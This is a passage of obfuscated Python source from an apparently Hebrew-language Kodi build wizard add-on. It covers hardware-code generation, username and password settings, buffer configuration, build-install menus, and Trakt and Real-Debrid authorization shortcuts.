                OO0O0OOO00OOO00O0 =O0O00O00O00OO00OO .group ().replace ('-',':')#line:1651
                O00OOOO00OOO0OOOO .append (OO0O0OOO00OOO00O0 )#line:1652
                O000OOO0OOO00OOOO =O000OOO0OOO00OOOO +int (OO0O0OOO00OOO00O0 .replace (':',''),16 )#line:1655
   else :#line:1657
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1658
   try :#line:1675
    return O000OOO0OOO00OOOO #line:1676
   except :pass #line:1677
def getpass ():#line:1678
	disply_hwr2 ()#line:1680
def setpass ():#line:1681
    O00OOO00O0OO00O00 =xbmcgui .Dialog ()#line:1682
    OO00O0000OOOO0O0O =''#line:1683
    O0OO0OOOO0O00O0OO =xbmc .Keyboard (OO00O0000OOOO0O0O ,'הכנס סיסמה')#line:1685
    O0OO0OOOO0O00O0OO .doModal ()#line:1686
    if O0OO0OOOO0O00O0OO .isConfirmed ():#line:1687
           O0OO0OOOO0O00O0OO =O0OO0OOOO0O00O0OO .getText ()#line:1688
    wiz .setS ('pass',str (O0OO0OOOO0O00O0OO ))#line:1689
def setuname ():#line:1690
    OOO0O0O0O00000OO0 =''#line:1691
    O00000OO00OO00000 =xbmc .Keyboard (OOO0O0O0O00000OO0 ,'הכנס שם משתמש')#line:1692
    O00000OO00OO00000 .doModal ()#line:1693
    if O00000OO00OO00000 .isConfirmed ():#line:1694
           OOO0O0O0O00000OO0 =O00000OO00OO00000 .getText ()#line:1695
           wiz .setS ('user',str (OOO0O0O0O00000OO0 ))#line:1696
def powerkodi ():#line:1697
    os ._exit (1 )#line:1698
def buffer1 ():#line:1700
	OO0OO000O00OO0OO0 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1701
	OOOOOOO00OOOO000O =xbmc .getInfoLabel ("System.Memory(total)")#line:1702
	O0OOO0000O0OOOOO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1703
	OOO0OO0O0O00OOO0O =re .sub ('[^0-9]','',O0OOO0000O0OOOOO0 )#line:1704
	OOO0OO0O0O00OOO0O =int (OOO0OO0O0O00OOO0O )/3 #line:1705
	OO0OO0O00O00OO0O0 =OOO0OO0O0O00OOO0O *1024 *1024 #line:1706
	try :O0OOOOO0O00O00O00 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1707
	except :O0OOOOO0O00O00O00 =16 #line:1708
	O0O0O0O000O0O0000 =DIALOG .yesno ('FREE MEMORY: '+str (O0OOO0000O0OOOOO0 ),'Based on your free Memory your optimal buffersize is: '+str (OOO0OO0O0O00OOO0O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1711
	if O0O0O0O000O0O0000 ==1 :#line:1712
		with open (OO0OO000O00OO0OO0 ,"w")as O00OO0OOO000OOO00 :#line:1713
			if O0OOOOO0O00O00O00 >=17 :OO000OOOOOO00000O =xml_data_advSettings_New (str (OO0OO0O00O00OO0O0 ))#line:1714
			else :OO000OOOOOO00000O =xml_data_advSettings_old (str (OO0OO0O00O00OO0O0 ))#line:1715
			O00OO0OOO000OOO00 .write (OO000OOOOOO00000O )#line:1717
			DIALOG .ok ('Buffer Size Set to: '+str (OO0OO0O00O00OO0O0 ),'Please restart Kodi for settings to apply.','')#line:1718
	elif O0O0O0O000O0O0000 ==0 :#line:1720
		OO0OO0O00O00OO0O0 =_OOO000000O0OO0O0O (default =str (OO0OO0O00O00OO0O0 ),heading ="INPUT BUFFER SIZE")#line:1721
		with open (OO0OO000O00OO0OO0 ,"w")as O00OO0OOO000OOO00 :#line:1722
			if O0OOOOO0O00O00O00 >=17 :OO000OOOOOO00000O =xml_data_advSettings_New (str (OO0OO0O00O00OO0O0 ))#line:1723
			else :OO000OOOOOO00000O =xml_data_advSettings_old (str (OO0OO0O00O00OO0O0 ))#line:1724
			O00OO0OOO000OOO00 .write (OO000OOOOOO00000O )#line:1725
			DIALOG .ok ('Buffer Size Set to: '+str (OO0OO0O00O00OO0O0 ),'Please restart Kodi for settings to apply.','')#line:1726
def xml_data_advSettings_old (OO0O00O0O0O000O0O ):#line:1727
	OO0000O0OOOOOO00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0O00O0O0O000O0O #line:1737
	return OO0000O0OOOOOO00O #line:1738
def xml_data_advSettings_New (OOO0OO00OO00O0O00 ):#line:1740
	OOOOO00OO000OO00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOO0OO00OO00O0O00 #line:1752
	return OOOOO00OO000OO00O #line:1753
def write_ADV_SETTINGS_XML (O000O00O000OO00O0 ):#line:1754
    if not os .path .exists (xml_file ):#line:1755
        with open (xml_file ,"w")as O0O00000OO00OO0OO :#line:1756
            O0O00000OO00OO0OO .write (xml_data )#line:1757
def _OOO000000O0OO0O0O (default ="",heading ="",hidden =False ):#line:1758
    ""#line:1759
    OOO0O0000OOO0OOOO =xbmc .Keyboard (default ,heading ,hidden )#line:1760
    OOO0O0000OOO0OOOO .doModal ()#line:1761
    if (OOO0O0000OOO0OOOO .isConfirmed ()):#line:1762
        return unicode (OOO0O0000OOO0OOOO .getText (),"utf-8")#line:1763
    return default #line:1764
def index ():#line:1766
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1767
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1768
	if AUTOUPDATE =='Yes':#line:1769
		if wiz .workingURL (WIZARDFILE )==True :#line:1770
			OO0OOOOO0OOO0OO0O =wiz .checkWizard ('version')#line:1771
			if OO0OOOOO0OOO0OO0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO0OOOOO0OOO0OO0O ),'wizardupdate',themeit =THEME2 )#line:1772
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1773
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1774
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1775
	if len (BUILDNAME )>0 :#line:1776
		O000OOOO00OO0O00O =wiz .checkBuild (BUILDNAME ,'version')#line:1777
		OO0O0OOOOO0OOOOO0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1778
		if O000OOOO00OO0O00O >BUILDVERSION :OO0O0OOOOO0OOOOO0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO0O0OOOOO0OOOOO0 ,O000OOOO00OO0O00O )#line:1779
		addDir (OO0O0OOOOO0OOOOO0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1781
		try :#line:1783
		     O0OO0OOOO00OOOOOO =wiz .themeCount (BUILDNAME )#line:1784
		except :#line:1785
		   O0OO0OOOO00OOOOOO =False #line:1786
		if not O0OO0OOOO00OOOOOO ==False :#line:1787
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1788
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1789
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1792
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1793
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1794
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1798
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1800
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1802
def morsetup ():#line:1804
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1805
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1806
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1807
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1808
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1812
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1813
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1816
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1817
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1819
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1820
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1828
	setView ('files','viewType')#line:1829
def morsetup2 ():#line:1830
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1831
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1832
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1833
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1834
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1835
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1836
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1837
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1838
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1839
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1840
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1841
def fastupdate ():#line:1842
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1843
def forcefastupdate ():#line:1845
			OOO00O0000000O000 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1846
			wiz .ForceFastUpDate (ADDONTITLE ,OOO00O0000000O000 )#line:1847
def rdsetup ():#line:1851
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1852
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1853
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1854
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1855
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1856
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1857
	setView ('files','viewType')#line:1858
def traktsetup ():#line:1860
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1861
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1862
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1863
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1864
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1865
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1866
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1867
	setView ('files','viewType')#line:1868
def resolveurlsetup ():#line:1870
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1871
def urlresolversetup ():#line:1872
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1873
def placentasetup ():#line:1875
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1876
def reptiliasetup ():#line:1877
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1878
def flixnetsetup ():#line:1879
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1880
def yodasetup ():#line:1881
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1882
def numberssetup ():#line:1883
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1884
def uranussetup ():#line:1885
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1886
def genesissetup ():#line:1887
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1888
def net_tools (view =None ):#line:1890
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1891
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1892
	setView ('files','viewType')#line:1894
def speedMenu ():#line:1895
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1896
def viewIP ():#line:1897
	OOO0000OOOO000OO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1911
	OOOOO0000OO00OO0O =[];OOOO0000O0O0OO00O =0 #line:1912
	for OO0O0O00OO00OOO00 in OOO0000OOOO000OO0 :#line:1913
		OO0OOO00OO0O0OOOO =wiz .getInfo (OO0O0O00OO00OOO00 )#line:1914
		OO0O00000OOOOO00O =0 #line:1915
		while OO0OOO00OO0O0OOOO =="Busy"and OO0O00000OOOOO00O <10 :#line:1916
			OO0OOO00OO0O0OOOO =wiz .getInfo (OO0O0O00OO00OOO00 );OO0O00000OOOOO00O +=1 ;wiz .log ("%s sleep %s"%(OO0O0O00OO00OOO00 ,str (OO0O00000OOOOO00O )));xbmc .sleep (1000 )#line:1917
		OOOOO0000OO00OO0O .append (OO0OOO00OO0O0OOOO )#line:1918
		OOOO0000O0O0OO00O +=1 #line:1919
	O00OO0O0OO000O000 ,OOO00OO000O000000 ,OO0OOOOOOOO00OOO0 =getIP ()#line:1920
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0000OO00OO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1921
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO0O0OO000O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1922
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO000O000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1923
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOOOOOO00OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1924
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0000OO00OO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1925
	setView ('files','viewType')#line:1926
def buildMenu ():#line:1928
	if USERNAME =='':#line:1929
		ADDON .openSettings ()#line:1930
		sys .exit ()#line:1931
	if PASSWORD =='':#line:1932
		ADDON .openSettings ()#line:1933
	O00OOOOOO0OOOO0O0 =u_list (SPEEDFILE )#line:1934
	(O00OOOOOO0OOOO0O0 )#line:1935
	OOO0O0O0O000OOO00 =(wiz .workingURL (O00OOOOOO0OOOO0O0 ))#line:1936
	(OOO0O0O0O000OOO00 )#line:1937
	OOO0O0O0O000OOO00 =wiz .workingURL (SPEEDFILE )#line:1938
	if not OOO0O0O0O000OOO00 ==True :#line:1939
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1940
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1941
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1942
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1943
		addFile ('%s'%OOO0O0O0O000OOO00 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1944
	else :#line:1945
		OOO0OO0O00OO00O0O ,O00O0OO0O000OOO00 ,O00OO000OOOO000O0 ,O0O0OO0OOO0O000O0 ,OO00OOOOO0OOO0O00 ,OO0OOOOOO0000OOOO ,OOOOOO0O00OOOOOOO =wiz .buildCount ()#line:1946
		O0O0O000000OOO0OO =False ;OO0OO0O00OOO00OO0 =[]#line:1947
		if THIRDPARTY =='true':#line:1948
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O0O000000OOO0OO =True ;OO0OO0O00OOO00OO0 .append ('1')#line:1949
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O0O000000OOO0OO =True ;OO0OO0O00OOO00OO0 .append ('2')#line:1950
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O0O000000OOO0OO =True ;OO0OO0O00OOO00OO0 .append ('3')#line:1951
		O0OO000OO0OOOO0O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1952
		OO00O00OOO00O000O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO000OO0OOOO0O0 )#line:1953
		if OOO0OO0O00OO00O0O ==1 and O0O0O000000OOO0OO ==False :#line:1954
			for O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ,OOO00O000OO0OO00O ,OO0OO00O00OO00000 ,O0O0000OOO0OO0O00 ,OO00O00OO0OO00000 ,O00000OO00O0O0O0O ,O0O0O0O00OOOO00OO ,O000OOOO00OO0O000 ,OO0000O0O0000O0O0 in OO00O00OOO00O000O :#line:1955
				if not SHOWADULT =='true'and O000OOOO00OO0O000 .lower ()=='yes':continue #line:1956
				if not DEVELOPER =='true'and wiz .strTest (O0O0O0O0OOO0OOO00 ):continue #line:1957
				viewBuild (OO00O00OOO00O000O [0 ][0 ])#line:1958
				return #line:1959
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1962
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1963
		if O0O0O000000OOO0OO ==True :#line:1964
			for O0OO0OOO00000OOOO in OO0OO0O00OOO00OO0 :#line:1965
				O0O0O0O0OOO0OOO00 =eval ('THIRD%sNAME'%O0OO0OOO00000OOOO )#line:1966
		if len (OO00O00OOO00O000O )>=1 :#line:1968
			if SEPERATE =='true':#line:1969
				for O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ,OOO00O000OO0OO00O ,OO0OO00O00OO00000 ,O0O0000OOO0OO0O00 ,OO00O00OO0OO00000 ,O00000OO00O0O0O0O ,O0O0O0O00OOOO00OO ,O000OOOO00OO0O000 ,OO0000O0O0000O0O0 in OO00O00OOO00O000O :#line:1970
					if not SHOWADULT =='true'and O000OOOO00OO0O000 .lower ()=='yes':continue #line:1971
					if not DEVELOPER =='true'and wiz .strTest (O0O0O0O0OOO0OOO00 ):continue #line:1972
					OO00OOO0OOOOO0OOO =createMenu ('install','',O0O0O0O0OOO0OOO00 )#line:1973
					addDir ('[%s] %s (v%s)'%(float (O0O0000OOO0OO0O00 ),O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ),'viewbuild',O0O0O0O0OOO0OOO00 ,description =OO0000O0O0000O0O0 ,fanart =O0O0O0O00OOOO00OO ,icon =O00000OO00O0O0O0O ,menu =OO00OOO0OOOOO0OOO ,themeit =THEME2 )#line:1974
			else :#line:1975
				if O0O0OO0OOO0O000O0 >0 :#line:1976
					O0O00OOO00O000O00 ='+'if SHOW17 =='false'else '-'#line:1977
					if SHOW17 =='true':#line:1979
						for O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ,OOO00O000OO0OO00O ,OO0OO00O00OO00000 ,O0O0000OOO0OO0O00 ,OO00O00OO0OO00000 ,O00000OO00O0O0O0O ,O0O0O0O00OOOO00OO ,O000OOOO00OO0O000 ,OO0000O0O0000O0O0 in OO00O00OOO00O000O :#line:1981
							if not SHOWADULT =='true'and O000OOOO00OO0O000 .lower ()=='yes':continue #line:1982
							if not DEVELOPER =='true'and wiz .strTest (O0O0O0O0OOO0OOO00 ):continue #line:1983
							OOO0000OO0O00OOOO =int (float (O0O0000OOO0OO0O00 ))#line:1984
							if OOO0000OO0O00OOOO ==17 :#line:1985
								OO00OOO0OOOOO0OOO =createMenu ('install','',O0O0O0O0OOO0OOO00 )#line:1986
								addDir ('[%s] %s (v%s)'%(float (O0O0000OOO0OO0O00 ),O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ),'viewbuild',O0O0O0O0OOO0OOO00 ,description =OO0000O0O0000O0O0 ,fanart =O0O0O0O00OOOO00OO ,icon =O00000OO00O0O0O0O ,menu =OO00OOO0OOOOO0OOO ,themeit =THEME2 )#line:1987
				if OO00OOOOO0OOO0O00 >0 :#line:1988
					O0O00OOO00O000O00 ='+'if SHOW18 =='false'else '-'#line:1989
					if SHOW18 =='true':#line:1991
						for O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ,OOO00O000OO0OO00O ,OO0OO00O00OO00000 ,O0O0000OOO0OO0O00 ,OO00O00OO0OO00000 ,O00000OO00O0O0O0O ,O0O0O0O00OOOO00OO ,O000OOOO00OO0O000 ,OO0000O0O0000O0O0 in OO00O00OOO00O000O :#line:1993
							if not SHOWADULT =='true'and O000OOOO00OO0O000 .lower ()=='yes':continue #line:1994
							if not DEVELOPER =='true'and wiz .strTest (O0O0O0O0OOO0OOO00 ):continue #line:1995
							OOO0000OO0O00OOOO =int (float (O0O0000OOO0OO0O00 ))#line:1996
							if OOO0000OO0O00OOOO ==18 :#line:1997
								OO00OOO0OOOOO0OOO =createMenu ('install','',O0O0O0O0OOO0OOO00 )#line:1998
								addDir ('[%s] %s (v%s)'%(float (O0O0000OOO0OO0O00 ),O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ),'viewbuild',O0O0O0O0OOO0OOO00 ,description =OO0000O0O0000O0O0 ,fanart =O0O0O0O00OOOO00OO ,icon =O00000OO00O0O0O0O ,menu =OO00OOO0OOOOO0OOO ,themeit =THEME2 )#line:1999
				if O00OO000OOOO000O0 >0 :#line:2000
					O0O00OOO00O000O00 ='+'if SHOW16 =='false'else '-'#line:2001
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0O00OOO00O000O00 ,O00OO000OOOO000O0 ),'togglesetting','show16',themeit =THEME3 )#line:2002
					if SHOW16 =='true':#line:2003
						for O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ,OOO00O000OO0OO00O ,OO0OO00O00OO00000 ,O0O0000OOO0OO0O00 ,OO00O00OO0OO00000 ,O00000OO00O0O0O0O ,O0O0O0O00OOOO00OO ,O000OOOO00OO0O000 ,OO0000O0O0000O0O0 in OO00O00OOO00O000O :#line:2004
							if not SHOWADULT =='true'and O000OOOO00OO0O000 .lower ()=='yes':continue #line:2005
							if not DEVELOPER =='true'and wiz .strTest (O0O0O0O0OOO0OOO00 ):continue #line:2006
							OOO0000OO0O00OOOO =int (float (O0O0000OOO0OO0O00 ))#line:2007
							if OOO0000OO0O00OOOO ==16 :#line:2008
								OO00OOO0OOOOO0OOO =createMenu ('install','',O0O0O0O0OOO0OOO00 )#line:2009
								addDir ('[%s] %s (v%s)'%(float (O0O0000OOO0OO0O00 ),O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ),'viewbuild',O0O0O0O0OOO0OOO00 ,description =OO0000O0O0000O0O0 ,fanart =O0O0O0O00OOOO00OO ,icon =O00000OO00O0O0O0O ,menu =OO00OOO0OOOOO0OOO ,themeit =THEME2 )#line:2010
				if O00O0OO0O000OOO00 >0 :#line:2011
					O0O00OOO00O000O00 ='+'if SHOW15 =='false'else '-'#line:2012
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0O00OOO00O000O00 ,O00O0OO0O000OOO00 ),'togglesetting','show15',themeit =THEME3 )#line:2013
					if SHOW15 =='true':#line:2014
						for O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ,OOO00O000OO0OO00O ,OO0OO00O00OO00000 ,O0O0000OOO0OO0O00 ,OO00O00OO0OO00000 ,O00000OO00O0O0O0O ,O0O0O0O00OOOO00OO ,O000OOOO00OO0O000 ,OO0000O0O0000O0O0 in OO00O00OOO00O000O :#line:2015
							if not SHOWADULT =='true'and O000OOOO00OO0O000 .lower ()=='yes':continue #line:2016
							if not DEVELOPER =='true'and wiz .strTest (O0O0O0O0OOO0OOO00 ):continue #line:2017
							OOO0000OO0O00OOOO =int (float (O0O0000OOO0OO0O00 ))#line:2018
							if OOO0000OO0O00OOOO <=15 :#line:2019
								OO00OOO0OOOOO0OOO =createMenu ('install','',O0O0O0O0OOO0OOO00 )#line:2020
								addDir ('[%s] %s (v%s)'%(float (O0O0000OOO0OO0O00 ),O0O0O0O0OOO0OOO00 ,O0000OO00O00O0OOO ),'viewbuild',O0O0O0O0OOO0OOO00 ,description =OO0000O0O0000O0O0 ,fanart =O0O0O0O00OOOO00OO ,icon =O00000OO00O0O0O0O ,menu =OO00OOO0OOOOO0OOO ,themeit =THEME2 )#line:2021
		elif OOOOOO0O00OOOOOOO >0 :#line:2022
			if OO0OOOOOO0000OOOO >0 :#line:2023
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2024
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2025
			else :#line:2026
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2027
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2028
	setView ('files','viewType')#line:2029
def viewBuild (O000O0O00O0O0O00O ):#line:2031
	OOO000OO00O000000 =wiz .workingURL (SPEEDFILE )#line:2032
	if not OOO000OO00O000000 ==True :#line:2033
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2034
		addFile ('%s'%OOO000OO00O000000 ,'',themeit =THEME3 )#line:2035
		return #line:2036
	if wiz .checkBuild (O000O0O00O0O0O00O ,'version')==False :#line:2037
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2038
		addFile ('%s was not found in the builds list.'%O000O0O00O0O0O00O ,'',themeit =THEME3 )#line:2039
		return #line:2040
	O0OO0O0O000O0O0OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2041
	OOO000O00OO000OO0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000O0O00O0O0O00O ).findall (O0OO0O0O000O0O0OO )#line:2042
